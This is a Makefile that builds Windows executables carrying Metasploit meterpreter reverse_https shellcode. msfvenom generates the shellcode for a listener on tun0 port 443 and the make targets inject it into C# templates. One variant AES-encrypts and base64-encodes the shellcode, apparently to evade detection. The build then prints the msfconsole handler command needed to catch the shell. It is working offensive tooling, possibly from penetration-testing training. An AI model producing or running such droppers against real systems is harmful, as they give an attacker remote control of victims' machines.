PAYLOAD := windows/x64/meterpreter/reverse_https
LHOST := tun0
LPORT := 443
ccyellow= \e[0;33m
ccend= \e[0m
LISTENER_CMD := "\n$(ccyellow)to start the listener run:\nmsfconsole -q -x \"use multi/handler;set payload $(PAYLOAD);set lhost $(LHOST); set lport $(LPORT); exploit\"$(ccend)"

all: classic classic_aes

sources:
	mkdir sources

output:
	mkdir output

classic.cs: sources templates/classic.cs
	export PAYLOAD=$$(msfvenom -p $(PAYLOAD) LHOST=$(LHOST) LPORT=$(LPORT) -f csharp); \
	cat templates/classic.cs | envsubst > sources/classic.cs

classic: output classic.cs
	mcs -out:output/classic.exe sources/classic.cs
	@echo $(LISTENER_CMD)

classic_aes.cs: sources templates/classic_aes.cs
	# hexdump -vn16 -e'4/8 "%08x" 1 "\n"' /dev/urandom ??
	export KEY=$$(uuidgen | tr -d "-"); \
	export IV=$$(uuidgen | tr -d "-"); \
	export BASE64_SHELLCODE=$$(msfvenom -p $(PAYLOAD) LHOST=$(LHOST) LPORT=$(LPORT) -f raw | openssl enc -aes-128-cbc -K $$KEY -iv $$IV -nosalt | base64 -w0); \
	cat templates/classic_aes.cs | envsubst > sources/classic_aes.cs

classic_aes: output classic_aes.cs
	mcs -out:output/classic_aes.exe sources/classic_aes.cs
	@echo $(LISTENER_CMD)

clean:
	rm -rf \
		sources \
		output
